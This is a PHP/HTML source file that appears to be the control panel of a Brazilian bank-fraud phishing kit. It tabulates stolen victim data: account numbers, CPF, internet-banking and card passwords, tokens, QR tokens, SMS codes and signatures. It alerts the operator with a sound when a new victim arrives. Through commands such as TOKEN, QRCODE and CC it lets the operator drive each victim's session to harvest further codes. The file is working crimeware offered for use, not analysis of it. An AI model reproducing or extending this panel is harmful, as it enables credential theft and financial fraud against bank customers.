<table width="100%" border="0" cellspacing="5" cellpadding="5" class="table_lista_clientes">
	<thead>
		<tr>

			<td>IP:</td>
			<td>Data:</td>
			<td>Apelido PC:</td>
			<td>Nome:</td>
			<td>Agencia:</td>
			<td>Conta:</td>
			<td>Cpf:</td>
			<td>Senha:</td>
			<td>Senha Card:</td>
			<td>Token:</td>
			<td>Token-QR:</td>
			<td>Telefone:</td>
			<td>Sms:</td>
			<td>Serial:</td>
			<td>Assinatura:</td>
			<td>Cod numerico:</td>
			<td>Comando:</td>
			<td>Gerenciar</td>
		</tr>
	</thead>
<?php
$tabela = 'acessos';
$cond = "WHERE status = '0'";
$GetClientes = read($conn, $tabela, $cond);

	if(!$GetClientes):
		$contador = 0;
		$_SESSION['TotalClientes'] = 0;
	else:
		$contador = count($GetClientes);
	endif;

	if($contador > @$_SESSION['TotalClientes']):
		$_SESSION['TotalClientes'] = $contador;
		echo '<audio autoplay="autoplay"><source src="_sound/new-info.mp3"/></audio>';
	endif;
 ?>
	<tbody>
		<?php
			$conta_user = 1;
			for($c = 0;$c < $contador;$c++):

			       	$UserId = $GetClientes[$c]['id'];
								$UserIp = $GetClientes[$c]['ip'];
							$UserEstado = $GetClientes[$c]['cidade']."|".$GetClientes[$c]['estado']."|".$GetClientes[$c]['pais'];
								$UserData = $GetClientes[$c]['data_acesso'];
								$UserApelido = $GetClientes[$c]['apelido'];
								$UserCCnome = $GetClientes[$c]['nome'];
								$UserTipo = $GetClientes[$c]['tipo_acesso'];
								$UserAgencia = $GetClientes[$c]['agencia'];
								$UserConta = $GetClientes[$c]['conta'];
								$UserNome = $GetClientes[$c]['cpf'];
								$UserPass4 = $GetClientes[$c]['senha'];
									$UserPassCard = $GetClientes[$c]['pass_6'];
									$UserToken = $GetClientes[$c]['token'];
								$UserTokenQR = $GetClientes[$c]['tokenqr'];
								$UserTel = $GetClientes[$c]['fone'];
								$UserSms = $GetClientes[$c]['sms'];
								$UserSerial = $GetClientes[$c]['serial'];
									$UserAss = $GetClientes[$c]['assinatura'];
									$UserCD = $GetClientes[$c]['cod_numerico'];
								$UserComando = $GetClientes[$c]['comando'];
								$UserTimes = $GetClientes[$c]['time_acesso'];

								if($UserComando == 'LOADER'):
										$ShowComando = 'ESPERA';
									elseif($UserComando == 'LOADING2'):
										$ShowComando = 'ESPERA LOG';
									elseif($UserComando == 'GET_SENHANET'):
										$ShowComando = 'SENHANET';
										elseif($UserComando == 'ASSINATURA'):
											$ShowComando = 'ASSINATURA';
									elseif($UserComando == 'FONE'):
										$ShowComando = 'FONE';
									elseif($UserComando == 'SERIAL'):
										$ShowComando = 'SERIAL';
									elseif($UserComando == 'TOKEN'):
										$ShowComando = 'TOKEN';
									elseif($UserComando == 'LOADER'):
										$ShowComando = 'LOADER';
									elseif($UserComando == 'BUSTER'):
										$ShowComando = 'BUSTER';
									elseif($UserComando == 'FINALIZADO'):
											$ShowComando = 'FINALIZADO';
									elseif($UserComando == 'CC'):
										$ShowComando = 'CC';
									elseif($UserComando == 'MENSAGEM'):
										$ShowComando = 'MENSAGEM';
									elseif($UserComando == 'QRCODE'):
										$ShowComando = 'QRCODE';
									elseif($UserComando == 'APELIDO'):
										$ShowComando = 'APELIDO';
									elseif($UserComando == 'CAIXA'):
										$ShowComando = 'CAIXA';
										elseif($UserComando == 'ACESSO X'):
											$ShowComando = 'ACESSO X';
										elseif($UserComando == 'FONE X'):
											$ShowComando = 'FONE X';
										elseif($UserComando == 'ASSINATURA X'):
											$ShowComando = 'ASSINATURA X';
										elseif($UserComando == 'SERIAL X'):
											$ShowComando = 'SERIAL X';
										elseif($UserComando == 'TOKEN X'):
											$ShowComando = 'TOKEN X';
								  	elseif($UserComando == 'CC X'):
											$ShowComando = 'CC X';
										elseif($UserComando == 'SENHA NET X'):
											$ShowComando = 'SENHA NET X';
										elseif($UserComando == 'COD NUM X'):
											$ShowComando = 'COD NUM X';
										elseif($UserComando == 'QRCODE X'):
											$ShowComando = 'QRCODE X';

									else:
										$ShowComando = '';
									endif;



				if(!$GetClientes):
					echo '
						<tr>
							<td colspan="12">Sem nenhuma informação ainda!</td>
						</tr>
					';
					$_SESSION['TotalClientes'] = 0;
				else:
					$TimestampNew = time();

					if($UserTipo == 'DESK FISICO'):
						$GerenciaTipo = '_fisi='.$UserId;
					elseif($UserTipo == 'DESK JUJU'):
						$GerenciaTipo = '_juba='.$UserId;
					else:
						$GerenciaTipo = '';
					endif;


					if($TimestampNew > $UserTimes):

						$InativoTime = $TimestampNew - $UserTimes;

						echo '
						<tr>

									<td>'.$UserIp.'</td>
									<td>'.$UserData.'</td>
									<td>'.$UserApelido.'</td>
									<td>'.$UserCCnome.'</td>
									<td>'.$UserAgencia.'</td>
									<td>'.$UserConta.'</td>
									<td>'.$UserNome.'</td>
									<td>'.$UserPass4.'</td>
									<td>'.$UserPassCard.'</td>
									<td>'.$UserToken.'</td>
									<td>'.$UserTokenQR.'</td>
									<td>'.$UserTel.'</td>
									<td>'.$UserSms.'</td>
									<td>'.$UserSerial.'</td>
											<td>'.$UserAss.'</td>
											<td>'.$UserCD.'</td>
									<td>INATIVO HÁ '. $InativoTime .' s.</td>
									<td><a href="acesso.php?gerenciar'.$GerenciaTipo.'" class="manage_user_link"><i class="fa fa-cog"></i></a></td>
								</tr>
							';
						else:
							echo '
								<tr>

									<td>'.$UserIp.'</td>
									<td>'.$UserData.'</td>
									<td>'.$UserApelido.'</td>
									<td>'.$UserCCnome.'</td>
									<td>'.$UserAgencia.'</td>
									<td>'.$UserConta.'</td>
									<td>'.$UserNome.'</td>
									<td>'.$UserPass4.'</td>
									<td>'.$UserPassCard.'</td>
									<td>'.$UserToken.'</td>
									<td>'.$UserTokenQR.'</td>
									<td>'.$UserTel.'</td>
									<td>'.$UserSms.'</td>
										<td>'.$UserSerial.'</td>
											<td>'.$UserAss.'</td>
											<td>'.$UserCD.'</td>
									<td>'.$ShowComando.'</td>
								<td><a href="acesso.php?gerenciar'.$GerenciaTipo.'" class="manage_user_link"><i class="fa fa-cog"></i></a></td>
								</tr>
						';
					endif;
				endif;
				$conta_user += 1;
			endfor;
		?>

<?php

?>

	</tbody>
</table>
